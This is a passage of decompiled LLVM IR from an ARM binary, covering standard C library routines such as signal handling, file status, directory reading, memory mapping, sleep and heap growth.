  %v2_14954 = inttoptr i32 %v1_14954 to i32*
  %v3_14954 = load i32, i32* %v2_14954, align 4
  store i32 %v3_14954, i32* @r3, align 4
  %v1_14958 = and i32 %v3_14954, 67108864
  %v2_14958 = icmp eq i32 %v1_14958, 0
  br i1 %v2_14958, label %dec_label_pc_14960, label %dec_label_pc_14990

dec_label_pc_14960:                               ; preds = %dec_label_pc_14954
  store i32 20, i32* @r2, align 4
  %v2_14964 = ptrtoint i32* %stack_var_-36 to i32
  store i32 %v2_14964, i32* @r0, align 4
  %v0_14968 = call i32 @memcpy()
  %v0_14990.pre = load i32, i32* @r5, align 4
  %v0_14998.pre = load i32, i32* %r6.global-to-local, align 4
  br label %dec_label_pc_14990

dec_label_pc_14990:                               ; preds = %dec_label_pc_14954, %entry, %dec_label_pc_14960
  %v0_14998 = phi i32 [ %arg3, %dec_label_pc_14954 ], [ %arg3, %entry ], [ %v0_14998.pre, %dec_label_pc_14960 ]
  %v0_14994 = phi i32 [ %arg2, %dec_label_pc_14954 ], [ 0, %entry ], [ %v2_14964, %dec_label_pc_14960 ]
  %v0_14990 = phi i32 [ %arg1, %dec_label_pc_14954 ], [ %arg1, %entry ], [ %v0_14990.pre, %dec_label_pc_14960 ]
  %v4_149a0 = call i32 @__syscall_rt_sigaction(i32 %v0_14990, i32 %v0_14994, i32 %v0_14998, i32 8)
  store i32 %v3_14934, i32* @r4, align 4
  store i32 %v6_14934, i32* @r5, align 4
  ret i32 %v4_149a0

; uselistorder directives
  uselistorder label %dec_label_pc_14990, { 2, 0, 1 }
}

define i32 @function_149b4(i32 %arg1) local_unnamed_addr {
dec_label_pc_149b4:
  %v0_149b4 = load i1, i1* @cpsr_z, align 1
  br i1 %v0_149b4, label %bb, label %.thread

bb:                                               ; preds = %dec_label_pc_149b4
  %v2_149b4 = load i32, i32* @r8, align 4
  %v4_149b4 = mul i32 %v2_149b4, 2
  %v5_149b4 = and i32 %v4_149b4, %arg1
  %v2_149b8 = load i32, i32* @ip, align 4
  %v4_149b8 = lshr i32 %v2_149b8, %v5_149b4
  %v5_149b8 = sub i32 32, %v5_149b4
  %v6_149b8 = shl i32 %v2_149b8, %v5_149b8
  %v7_149b8 = or i32 %v6_149b8, %v4_149b8
  %v9_149b8 = and i32 %v7_149b8, %v5_149b4
  br label %.thread

.thread:                                          ; preds = %dec_label_pc_149b4, %bb
  %v10_149b8 = phi i32 [ %arg1, %dec_label_pc_149b4 ], [ %v9_149b8, %bb ]
  ret i32 %v10_149b8

; uselistorder directives
  uselistorder i32 %arg1, { 1, 0 }
  uselistorder label %.thread, { 1, 0 }
}

define i32 @_setjmp(i32 %arg1) local_unnamed_addr {
entry:
  store i32 0, i32* @r1, align 4
  %v0_149c0 = call i32 @__sigsetjmp()
  ret i32 %v0_149c0
}

define i32 @__default_sa_restorer(i32 %arg1) local_unnamed_addr {
entry:
  ret i32 %arg1
}

define i32 @__default_rt_sa_restorer(i32 %arg1) local_unnamed_addr {
entry:
  ret i32 %arg1
}

define i32 @__aeabi_read_tp() local_unnamed_addr {
entry:
  call void @__pseudo_branch(i32 -61472)
  ret i32 -61441
}

define i32 @__syscall_rt_sigaction(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_149f0 = load i32, i32* @r7, align 4
  store i32 %v3_149f0, i32* %stack_var_-8, align 4
  %v0_149fc = load i32, i32* %r0.global-to-local, align 4
  store i32 %v0_149fc, i32* %r2.global-to-local, align 4
  %tmp = icmp ult i32 %v0_149fc, -4095
  br i1 %tmp, label %dec_label_pc_14a24, label %dec_label_pc_14a0c

dec_label_pc_14a0c:                               ; preds = %entry
  %v0_14a10 = call i32 @__aeabi_read_tp()
  %v3_14a14 = load i16, i16* @global_var_216ec.303, align 2
  %v4_14a14 = sext i16 %v3_14a14 to i32
  %v0_14a18 = load i32, i32* %r2.global-to-local, align 4
  %v1_14a18 = sub i32 0, %v0_14a18
  store i32 %v1_14a18, i32* %r2.global-to-local, align 4
  %v3_14a1c = add i32 %v4_14a14, %v0_14a10
  %v4_14a1c = inttoptr i32 %v3_14a1c to i32*
  store i32 %v1_14a18, i32* %v4_14a1c, align 4
  store i32 -1, i32* %r0.global-to-local, align 4
  %v2_14a24.pre = load i32, i32* %stack_var_-8, align 4
  br label %dec_label_pc_14a24

dec_label_pc_14a24:                               ; preds = %entry, %dec_label_pc_14a0c
  %v1_14a28 = phi i32 [ %v0_149fc, %entry ], [ -1, %dec_label_pc_14a0c ]
  %v2_14a24 = phi i32 [ %v3_149f0, %entry ], [ %v2_14a24.pre, %dec_label_pc_14a0c ]
  store i32 %v2_14a24, i32* @r7, align 4
  ret i32 %v1_14a28

; uselistorder directives
  uselistorder i32 %v0_149fc, { 1, 0, 2 }
  uselistorder i32* %r0.global-to-local, { 2, 0, 1 }
  uselistorder label %dec_label_pc_14a24, { 1, 0 }
}

define i32 @__GI__exit(i32 %arg1) local_unnamed_addr {
entry:
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_14a3c

dec_label_pc_14a3c:                               ; preds = %dec_label_pc_14a68, %dec_label_pc_14a7c, %entry
  %v0_14a3c = phi i32 [ %arg1, %entry ], [ %v0_14a3c.pre.pre, %dec_label_pc_14a7c ], [ %v0_14a68, %dec_label_pc_14a68 ]
  store i32 %v0_14a3c, i32* %r2.global-to-local, align 4
  %tmp = icmp ult i32 %v0_14a3c, -4095
  br i1 %tmp, label %dec_label_pc_14a68, label %dec_label_pc_14a58

dec_label_pc_14a58:                               ; preds = %dec_label_pc_14a3c
  %v0_14a58 = call i32 @__aeabi_read_tp()
  %v0_14a5c = load i32, i32* %r2.global-to-local, align 4
  %v1_14a5c = sub i32 0, %v0_14a5c
  store i32 %v1_14a5c, i32* %r2.global-to-local, align 4
  %v3_14a60 = load i16, i16* @global_var_216ec.303, align 2
  %v4_14a60 = sext i16 %v3_14a60 to i32
  %v3_14a64 = add i32 %v4_14a60, %v0_14a58
  %v4_14a64 = inttoptr i32 %v3_14a64 to i32*
  store i32 %v1_14a5c, i32* %v4_14a64, align 4
  %v0_14a68.pre = load i32, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_14a68

dec_label_pc_14a68:                               ; preds = %dec_label_pc_14a3c, %dec_label_pc_14a58
  %v0_14a68 = phi i32 [ %v0_14a3c, %dec_label_pc_14a3c ], [ %v0_14a68.pre, %dec_label_pc_14a58 ]
  store i32 %v0_14a68, i32* %r2.global-to-local, align 4
  %tmp4 = icmp ult i32 %v0_14a68, -4095
  br i1 %tmp4, label %dec_label_pc_14a3c, label %dec_label_pc_14a7c

dec_label_pc_14a7c:                               ; preds = %dec_label_pc_14a68
  %v0_14a7c = call i32 @__aeabi_read_tp()
  %v0_14a80 = load i32, i32* %r2.global-to-local, align 4
  %v1_14a80 = sub i32 0, %v0_14a80
  store i32 %v1_14a80, i32* %r2.global-to-local, align 4
  %v3_14a84 = load i16, i16* @global_var_216ec.303, align 2
  %v4_14a84 = sext i16 %v3_14a84 to i32
  %v3_14a88 = add i32 %v4_14a84, %v0_14a7c
  %v4_14a88 = inttoptr i32 %v3_14a88 to i32*
  store i32 %v1_14a80, i32* %v4_14a88, align 4
  %v0_14a3c.pre.pre = load i32, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_14a3c

; uselistorder directives
  uselistorder i32 %v0_14a68, { 0, 2, 1 }
  uselistorder i32 %v0_14a3c, { 1, 0, 2 }
  uselistorder i32* %r1.global-to-local, { 1, 0, 2 }
  uselistorder label %dec_label_pc_14a68, { 1, 0 }
  uselistorder label %dec_label_pc_14a3c, { 1, 0, 2 }
}

define i32 @fstat() local_unnamed_addr {
entry:
  %r7.global-to-local = alloca i32, align 4
  %v0_14aa0 = load i32, i32* @r1, align 4
  store i32 %v0_14aa0, i32* @r3, align 4
  store i32 197, i32* %r7.global-to-local, align 4
  %v0_14ab0 = load i32, i32* @r0, align 4
  store i32 %v0_14ab0, i32* @r2, align 4
  %tmp = icmp ult i32 %v0_14ab0, -4095
  br i1 %tmp, label %dec_label_pc_14ad8, label %dec_label_pc_14abc

dec_label_pc_14abc:                               ; preds = %entry
  %v0_14ac0 = call i32 @__aeabi_read_tp()
  %v3_14ac4 = load i16, i16* @global_var_216ec.303, align 2
  %v4_14ac4 = sext i16 %v3_14ac4 to i32
  store i32 %v4_14ac4, i32* @r3, align 4
  %v0_14ac8 = load i32, i32* @r2, align 4
  %v1_14ac8 = sub i32 0, %v0_14ac8
  store i32 %v1_14ac8, i32* @r2, align 4
  store i32 -1, i32* %r7.global-to-local, align 4
  %v3_14ad0 = add i32 %v4_14ac4, %v0_14ac0
  %v4_14ad0 = inttoptr i32 %v3_14ad0 to i32*
  store i32 %v1_14ac8, i32* %v4_14ad0, align 4
  br label %dec_label_pc_14ae8

dec_label_pc_14ad8:                               ; preds = %entry
  store i32 %v0_14ab0, i32* %r7.global-to-local, align 4
  %v2_14ad8 = icmp eq i32 %v0_14ab0, 0
  br i1 %v2_14ad8, label %bb, label %.thread

bb:                                               ; preds = %dec_label_pc_14ad8
  br label %.thread

.thread:                                          ; preds = %dec_label_pc_14ad8, %bb
  call void @__pseudo_cond_branch(i1 %v2_14ad8, i32 ptrtoint (i32* @global_var_14f28.538 to i32))
  br label %dec_label_pc_14ae8

dec_label_pc_14ae8:                               ; preds = %dec_label_pc_14abc, %.thread
  %v0_14ae8 = load i32, i32* %r7.global-to-local, align 4
  ret i32 %v0_14ae8

; uselistorder directives
  uselistorder i32 %v0_14ab0, { 1, 2, 0, 3 }
  uselistorder i32* %r7.global-to-local, { 1, 0, 2, 3 }
  uselistorder label %dec_label_pc_14ae8, { 1, 0 }
  uselistorder label %.thread, { 1, 0 }
}

define i32 @__getdents(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %r3.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  %r8.global-to-local = alloca i32, align 4
  %v6_14afc = load i32, i32* @r5, align 4
  %v18_14afc = load i32, i32* @sl, align 4
  store i32 141, i32* %r7.global-to-local, align 4
  store i32 %arg1, i32* @r5, align 4
  %tmp = icmp ult i32 %arg1, -4095
  br i1 %tmp, label %dec_label_pc_14b34, label %dec_label_pc_14b18

dec_label_pc_14b18:                               ; preds = %entry
  %v1_14b1c = sub i32 0, %arg1
  %v3_14b20 = load i16, i16* @global_var_216ec.303, align 2
  %v4_14b20 = sext i16 %v3_14b20 to i32
  store i32 %v4_14b20, i32* %r3.global-to-local, align 4
  %v0_14b24 = call i32 @__aeabi_read_tp()
  store i32 -1, i32* @r5, align 4
  %v3_14b2c = add i32 %v4_14b20, %v0_14b24
  %v4_14b2c = inttoptr i32 %v3_14b2c to i32*
  store i32 %v1_14b1c, i32* %v4_14b2c, align 4
  br label %dec_label_pc_14b88

dec_label_pc_14b34:                               ; preds = %entry
  br i1 false, label %.thread, label %bb

bb:                                               ; preds = %dec_label_pc_14b34
  store i32 %arg2, i32* %r7.global-to-local, align 4
  %v3_14b3c = add i32 %arg2, %arg1
  store i32 %v3_14b3c, i32* @sl, align 4
  br label %.thread

.thread:                                          ; preds = %dec_label_pc_14b34, %bb
  %v1_14b784 = phi i32 [ %v18_14afc, %dec_label_pc_14b34 ], [ %v3_14b3c, %bb ]
  %v0_14b742 = phi i32 [ 141, %dec_label_pc_14b34 ], [ %arg2, %bb ]
  br i1 false, label %dec_label_pc_14b88, label %dec_label_pc_14b74

dec_label_pc_14b48:                               ; preds = %dec_label_pc_14b74
  %v1_14b7c = inttoptr i32 %v1_14b74 to i8*
  %v1_14b48 = add i32 %v0_14b48, 8
  %v2_14b48 = inttoptr i32 %v1_14b48 to i16*
  %v3_14b48 = load i16, i16* %v2_14b48, align 2
  %v4_14b48 = zext i16 %v3_14b48 to i32
  %v2_14b4c = add i32 %v4_14b48, %v0_14b48
  store i32 %v2_14b4c, i32* @r3, align 4
  %v1_14b50 = add i32 %v2_14b4c, -1
  %v2_14b50 = inttoptr i32 %v1_14b50 to i8*
  %v3_14b50 = load i8, i8* %v2_14b50, align 1
  %v4_14b50 = zext i8 %v3_14b50 to i32
  store i32 %v4_14b50, i32* @r4, align 4
  %v3_14b54 = call i32 @strlen(i8* %v1_14b7c)
  %v0_14b58 = load i32, i32* %r6.global-to-local, align 4
  store i32 %v0_14b58, i32* @r1, align 4
  %v1_14b5c = add i32 %v3_14b54, 1
  store i32 %v1_14b5c, i32* @r2, align 4
  %v0_14b60 = load i32, i32* %r8.global-to-local, align 4
  store i32 %v0_14b60, i32* @r0, align 4
  %v3_14b64 = call i32 @memmove(i32 %v0_14b60, i32 %v0_14b58, i32 %v1_14b5c)
  %v0_14b68 = load i32, i32* %r7.global-to-local, align 4
  %v1_14b68 = add i32 %v0_14b68, 8
  %v2_14b68 = inttoptr i32 %v1_14b68 to i16*
  %v3_14b68 = load i16, i16* %v2_14b68, align 2
  %v4_14b68 = zext i16 %v3_14b68 to i32
  store i32 %v4_14b68, i32* %r3.global-to-local, align 4
  %v0_14b6c = load i32, i32* @r4, align 4
  %v1_14b6c = trunc i32 %v0_14b6c to i8
  %v3_14b6c = add i32 %v0_14b68, 10
  %v4_14b6c = inttoptr i32 %v3_14b6c to i8*
  store i8 %v1_14b6c, i8* %v4_14b6c, align 1
  %v0_14b70 = load i32, i32* %r7.global-to-local, align 4
  %v1_14b70 = load i32, i32* %r3.global-to-local, align 4
  %v2_14b70 = add i32 %v1_14b70, %v0_14b70
  store i32 %v2_14b70, i32* %r7.global-to-local, align 4
  %v1_14b78.pre = load i32, i32* @sl, align 4
  br label %dec_label_pc_14b74

dec_label_pc_14b74:                               ; preds = %.thread, %dec_label_pc_14b48
  %v1_14b78 = phi i32 [ %v1_14b78.pre, %dec_label_pc_14b48 ], [ %v1_14b784, %.thread ]
  %v0_14b48 = phi i32 [ %v2_14b70, %dec_label_pc_14b48 ], [ %v0_14b742, %.thread ]
  %v1_14b74 = add i32 %v0_14b48, 10
  store i32 %v1_14b74, i32* %r6.global-to-local, align 4
  %v3_14b78 = icmp ult i32 %v0_14b48, %v1_14b78
  %v1_14b80 = add i32 %v0_14b48, 11
  store i32 %v1_14b80, i32* %r8.global-to-local, align 4
  br i1 %v3_14b78, label %dec_label_pc_14b48, label %dec_label_pc_14b88

dec_label_pc_14b88:                               ; preds = %dec_label_pc_14b74, %.thread, %dec_label_pc_14b18
  %v0_14b88 = load i32, i32* @r5, align 4
  store i32 %v6_14afc, i32* @r5, align 4
  store i32 %v18_14afc, i32* @sl, align 4
  ret i32 %v0_14b88

; uselistorder directives
  uselistorder i32 %v1_14b74, { 1, 0 }
  uselistorder i32 %v0_14b48, { 2, 4, 3, 1, 0 }
  uselistorder i32 %v18_14afc, { 1, 0 }
  uselistorder i32* %r8.global-to-local, { 1, 0 }
  uselistorder i32* %r7.global-to-local, { 0, 2, 3, 1, 4 }
  uselistorder i32* %r6.global-to-local, { 1, 0 }
  uselistorder i32 (i32, i32, i32)* @memmove, { 1, 0, 2 }
  uselistorder i32 %arg2, { 1, 0, 2 }
  uselistorder i32 %arg1, { 1, 2, 0, 3 }
  uselistorder label %dec_label_pc_14b74, { 1, 0 }
  uselistorder label %.thread, { 1, 0 }
}

define i32 @getdtablesize() local_unnamed_addr {
entry:
  %stack_var_-16 = alloca i32, align 4
  %v2_14ba0 = ptrtoint i32* %stack_var_-16 to i32
  %v2_14bac = call i32 @getrlimit(i32 7, i32 %v2_14ba0)
  %v1_14bb0 = icmp slt i32 %v2_14bac, 0
  %v5_14bb4 = load i32, i32* %stack_var_-16, align 4
  %storemerge = select i1 %v1_14bb0, i32 256, i32 %v5_14bb4
  ret i32 %storemerge
}

define i32 @getegid() local_unnamed_addr {
entry:
  %v1_14bd8 = load i32, i32* @r0, align 4
  ret i32 %v1_14bd8
}

define i32 @geteuid() local_unnamed_addr {
entry:
  %v1_14bec = load i32, i32* @r0, align 4
  ret i32 %v1_14bec
}

define i32 @getgid(i32 %arg1) local_unnamed_addr {
entry:
  %v1_14c00 = load i32, i32* @r0, align 4
  ret i32 %v1_14c00
}

define i32 @__GI_getpagesize() local_unnamed_addr {
entry:
  %v4_14c10 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_21694.308 to i32), i32 148) to i32*), align 4
  %v1_14c14 = inttoptr i32 %v4_14c10 to i32*
  %v2_14c14 = load i32, i32* %v1_14c14, align 4
  %v2_14c18 = icmp eq i32 %v2_14c14, 0
  br i1 %v2_14c18, label %bb, label %bb2

bb:                                               ; preds = %entry
  br label %bb2

bb2:                                              ; preds = %entry, %bb
  %v1_14c20 = phi i32 [ %v2_14c14, %entry ], [ 4096, %bb ]
  ret i32 %v1_14c20

; uselistorder directives
  uselistorder label %bb2, { 1, 0 }
}

define i32 @getrlimit(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %tmp = icmp ult i32 %arg1, -4095
  br i1 %tmp, label %dec_label_pc_14c58, label %dec_label_pc_14c40

dec_label_pc_14c40:                               ; preds = %entry
  %v1_14c44 = sub i32 0, %arg1
  %v3_14c48 = load i16, i16* @global_var_216ec.303, align 2
  %v4_14c48 = sext i16 %v3_14c48 to i32
  %v0_14c4c = call i32 @__aeabi_read_tp()
  %v3_14c50 = add i32 %v4_14c48, %v0_14c4c
  %v4_14c50 = inttoptr i32 %v3_14c50 to i32*
  store i32 %v1_14c44, i32* %v4_14c50, align 4
  br label %dec_label_pc_14c58

dec_label_pc_14c58:                               ; preds = %entry, %dec_label_pc_14c40
  %v1_14c5c = phi i32 [ %arg1, %entry ], [ -1, %dec_label_pc_14c40 ]
  ret i32 %v1_14c5c

; uselistorder directives
  uselistorder i32 %arg1, { 1, 0, 2 }
  uselistorder label %dec_label_pc_14c58, { 1, 0 }
}

define i32 @gettimeofday(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_14c64 = load i32, i32* @r7, align 4
  store i32 %v3_14c64, i32* %stack_var_-8, align 4
  %v0_14c70 = load i32, i32* %r0.global-to-local, align 4
  store i32 %v0_14c70, i32* %r2.global-to-local, align 4
  %tmp = icmp ult i32 %v0_14c70, -4095
  br i1 %tmp, label %dec_label_pc_14c98, label %dec_label_pc_14c80

dec_label_pc_14c80:                               ; preds = %entry
  %v0_14c84 = call i32 @__aeabi_read_tp()
  %v3_14c88 = load i16, i16* @global_var_216ec.303, align 2
  %v4_14c88 = sext i16 %v3_14c88 to i32
  store i32 %v4_14c88, i32* @r3, align 4
  %v0_14c8c = load i32, i32* %r2.global-to-local, align 4
  %v1_14c8c = sub i32 0, %v0_14c8c
  store i32 %v1_14c8c, i32* %r2.global-to-local, align 4
  %v3_14c90 = add i32 %v4_14c88, %v0_14c84
  %v4_14c90 = inttoptr i32 %v3_14c90 to i32*
  store i32 %v1_14c8c, i32* %v4_14c90, align 4
  store i32 -1, i32* %r0.global-to-local, align 4
  %v2_14c98.pre = load i32, i32* %stack_var_-8, align 4
  br label %dec_label_pc_14c98

dec_label_pc_14c98:                               ; preds = %entry, %dec_label_pc_14c80
  %v1_14c9c = phi i32 [ %v0_14c70, %entry ], [ -1, %dec_label_pc_14c80 ]
  %v2_14c98 = phi i32 [ %v3_14c64, %entry ], [ %v2_14c98.pre, %dec_label_pc_14c80 ]
  store i32 %v2_14c98, i32* @r7, align 4
  ret i32 %v1_14c9c

; uselistorder directives
  uselistorder i32 %v0_14c70, { 1, 0, 2 }
  uselistorder i32* %r0.global-to-local, { 2, 0, 1 }
  uselistorder label %dec_label_pc_14c98, { 1, 0 }
}

define i32 @getuid() local_unnamed_addr {
entry:
  %v1_14cb4 = load i32, i32* @r0, align 4
  ret i32 %v1_14cb4
}

define i32 @mremap(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %stack_var_-12 = alloca i32, align 4
  %v3_14cb8 = load i32, i32* @r4, align 4
  store i32 %v3_14cb8, i32* %stack_var_-12, align 4
  %v0_14cc8 = load i32, i32* %r0.global-to-local, align 4
  store i32 %v0_14cc8, i32* %r2.global-to-local, align 4
  %tmp = icmp ult i32 %v0_14cc8, -4095
  br i1 %tmp, label %dec_label_pc_14cf0, label %dec_label_pc_14cd8

dec_label_pc_14cd8:                               ; preds = %entry
  %v0_14cdc = call i32 @__aeabi_read_tp()
  %v3_14ce0 = load i16, i16* @global_var_216ec.303, align 2
  %v4_14ce0 = sext i16 %v3_14ce0 to i32
  %v0_14ce4 = load i32, i32* %r2.global-to-local, align 4
  %v1_14ce4 = sub i32 0, %v0_14ce4
  store i32 %v1_14ce4, i32* %r2.global-to-local, align 4
  %v3_14ce8 = add i32 %v4_14ce0, %v0_14cdc
  %v4_14ce8 = inttoptr i32 %v3_14ce8 to i32*
  store i32 %v1_14ce4, i32* %v4_14ce8, align 4
  store i32 -1, i32* %r0.global-to-local, align 4
  %v2_14cf0.pre = load i32, i32* %stack_var_-12, align 4
  br label %dec_label_pc_14cf0

dec_label_pc_14cf0:                               ; preds = %entry, %dec_label_pc_14cd8
  %v1_14cf4 = phi i32 [ %v0_14cc8, %entry ], [ -1, %dec_label_pc_14cd8 ]
  %v2_14cf0 = phi i32 [ %v3_14cb8, %entry ], [ %v2_14cf0.pre, %dec_label_pc_14cd8 ]
  store i32 %v2_14cf0, i32* @r4, align 4
  ret i32 %v1_14cf4

; uselistorder directives
  uselistorder i32 %v0_14cc8, { 1, 0, 2 }
  uselistorder i32* %r0.global-to-local, { 2, 0, 1 }
  uselistorder label %dec_label_pc_14cf0, { 1, 0 }
}

define i32 @munmap(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_14cfc = load i32, i32* @r7, align 4
  store i32 %v3_14cfc, i32* %stack_var_-8, align 4
  %v0_14d08 = load i32, i32* %r0.global-to-local, align 4
  store i32 %v0_14d08, i32* %r2.global-to-local, align 4
  %tmp = icmp ult i32 %v0_14d08, -4095
  br i1 %tmp, label %dec_label_pc_14d30, label %dec_label_pc_14d18

dec_label_pc_14d18:                               ; preds = %entry
  %v0_14d1c = call i32 @__aeabi_read_tp()
  %v3_14d20 = load i16, i16* @global_var_216ec.303, align 2
  %v4_14d20 = sext i16 %v3_14d20 to i32
  %v0_14d24 = load i32, i32* %r2.global-to-local, align 4
  %v1_14d24 = sub i32 0, %v0_14d24
  store i32 %v1_14d24, i32* %r2.global-to-local, align 4
  %v3_14d28 = add i32 %v4_14d20, %v0_14d1c
  %v4_14d28 = inttoptr i32 %v3_14d28 to i32*
  store i32 %v1_14d24, i32* %v4_14d28, align 4
  store i32 -1, i32* %r0.global-to-local, align 4
  %v2_14d30.pre = load i32, i32* %stack_var_-8, align 4
  br label %dec_label_pc_14d30

dec_label_pc_14d30:                               ; preds = %entry, %dec_label_pc_14d18
  %v1_14d34 = phi i32 [ %v0_14d08, %entry ], [ -1, %dec_label_pc_14d18 ]
  %v2_14d30 = phi i32 [ %v3_14cfc, %entry ], [ %v2_14d30.pre, %dec_label_pc_14d18 ]
  store i32 %v2_14d30, i32* @r7, align 4
  ret i32 %v1_14d34

; uselistorder directives
  uselistorder i32 %v0_14d08, { 1, 0, 2 }
  uselistorder i32* %r0.global-to-local, { 2, 0, 1 }
  uselistorder label %dec_label_pc_14d30, { 1, 0 }
}

define i32 @__syscall_nanosleep() local_unnamed_addr {
entry:
  %r2.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_14d3c = load i32, i32* @r7, align 4
  store i32 %v3_14d3c, i32* %stack_var_-8, align 4
  %v0_14d48 = load i32, i32* @r0, align 4
  store i32 %v0_14d48, i32* %r2.global-to-local, align 4
  %tmp = icmp ult i32 %v0_14d48, -4095
  br i1 %tmp, label %dec_label_pc_14d70, label %dec_label_pc_14d58

dec_label_pc_14d58:                               ; preds = %entry
  %v0_14d5c = call i32 @__aeabi_read_tp()
  %v3_14d60 = load i16, i16* @global_var_216ec.303, align 2
  %v4_14d60 = sext i16 %v3_14d60 to i32
  %v0_14d64 = load i32, i32* %r2.global-to-local, align 4
  %v1_14d64 = sub i32 0, %v0_14d64
  store i32 %v1_14d64, i32* %r2.global-to-local, align 4
  %v3_14d68 = add i32 %v4_14d60, %v0_14d5c
  %v4_14d68 = inttoptr i32 %v3_14d68 to i32*
  store i32 %v1_14d64, i32* %v4_14d68, align 4
  %v2_14d70.pre = load i32, i32* %stack_var_-8, align 4
  br label %dec_label_pc_14d70

dec_label_pc_14d70:                               ; preds = %entry, %dec_label_pc_14d58
  %v1_14d74 = phi i32 [ %v0_14d48, %entry ], [ -1, %dec_label_pc_14d58 ]
  %v2_14d70 = phi i32 [ %v3_14d3c, %entry ], [ %v2_14d70.pre, %dec_label_pc_14d58 ]
  store i32 %v2_14d70, i32* @r7, align 4
  ret i32 %v1_14d74

; uselistorder directives
  uselistorder i32 %v0_14d48, { 1, 0, 2 }
  uselistorder label %dec_label_pc_14d70, { 1, 0 }
}

define i32 @__libc_nanosleep(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  store i32 %arg1, i32* @r0, align 4
  %v4_14d88 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_21694.308 to i32), i32 12776) to i32*), align 4
  %v2_14d8c = icmp eq i32 %v4_14d88, 0
  %v3_14d90 = load i32, i32* @r4, align 4
  %v9_14d90 = load i32, i32* @r6, align 4
  store i32 %arg1, i32* @r4, align 4
  store i32 %arg2, i32* @r6, align 4
  br i1 %v2_14d8c, label %dec_label_pc_14da0, label %entry.dec_label_pc_14da8_crit_edge

entry.dec_label_pc_14da8_crit_edge:               ; preds = %entry
  br label %dec_label_pc_14da8

dec_label_pc_14da0:                               ; preds = %entry
  store i32 %v3_14d90, i32* @r4, align 4
  store i32 %v9_14d90, i32* @r6, align 4
  %v0_14da4 = call i32 @__syscall_nanosleep()
  br label %dec_label_pc_14da8

dec_label_pc_14da8:                               ; preds = %entry.dec_label_pc_14da8_crit_edge, %dec_label_pc_14da0
  %v0_14da8 = call i32 @__libc_enable_asynccancel()
  %v0_14dac = load i32, i32* @r6, align 4
  store i32 %v0_14dac, i32* @r1, align 4
  store i32 %v0_14da8, i32* @r5, align 4
  %v0_14db4 = load i32, i32* @r4, align 4
  store i32 %v0_14db4, i32* @r0, align 4
  %v0_14db8 = call i32 @__syscall_nanosleep()
  store i32 %v0_14db8, i32* @r4, align 4
  %v0_14dc0 = load i32, i32* @r5, align 4
  %v1_14dc4 = call i32 @__libc_disable_asynccancel(i32 %v0_14dc0)
  %v0_14dc8 = load i32, i32* @r4, align 4
  ret i32 %v0_14dc8

; uselistorder directives
  uselistorder i32 (i32)* @__libc_disable_asynccancel, { 3, 2, 12, 1, 7, 6, 5, 8, 11, 4, 10, 9, 0 }
  uselistorder i32 ()* @__libc_enable_asynccancel, { 3, 2, 12, 1, 7, 6, 5, 8, 11, 4, 10, 9, 0 }
  uselistorder label %dec_label_pc_14da8, { 1, 0 }
}

define i32 @__GI_sbrk(i32 %arg1) local_unnamed_addr {
entry:
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  %stack_var_-16 = alloca i32, align 4
  %v3_14ddc = load i32, i32* @r4, align 4
  store i32 %v3_14ddc, i32* %stack_var_-16, align 4
  store i32 11576, i32* %r6.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_21694.308 to i32), i32* %r4.global-to-local, align 4
  %v4_14dec = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_21694.308 to i32), i32 11576) to i32*), align 4
  %v2_14df0 = icmp eq i32 %v4_14dec, 0
  store i32 %arg1, i32* %r5.global-to-local, align 4
  br i1 %v2_14df0, label %dec_label_pc_14dfc, label %dec_label_pc_14e0c

dec_label_pc_14dfc:                               ; preds = %entry
  %v1_14e00 = call i32 @__GI_brk(i32 0)
  %v1_14e04 = icmp slt i32 %v1_14e00, 0
  br i1 %v1_14e04, label %dec_label_pc_14e30, label %dec_label_pc_14e0cthread-pre-split

dec_label_pc_14e0cthread-pre-split:               ; preds = %dec_label_pc_14dfc
  %v0_14e10.pr = load i32, i32* %r5.global-to-local, align 4
  %v0_14e0c.pre = load i32, i32* %r4.global-to-local, align 4
  %v1_14e0c.pre = load i32, i32* %r6.global-to-local, align 4
  br label %dec_label_pc_14e0c

dec_label_pc_14e0c:                               ; preds = %dec_label_pc_14e0cthread-pre-split, %entry
  %v1_14e0c = phi i32 [ %v1_14e0c.pre, %dec_label_pc_14e0cthread-pre-split ], [ 11576, %entry ]
  %v0_14e0c = phi i32 [ %v0_14e0c.pre, %dec_label_pc_14e0cthread-pre-split ], [ ptrtoint (i32* @global_var_21694.308 to i32), %entry ]
  %v1_14e20 = phi i32 [ %v0_14e10.pr, %dec_label_pc_14e0cthread-pre-split ], [ %arg1, %entry ]
  %v2_14e0c = add i32 %v0_14e0c, %v1_14e0c
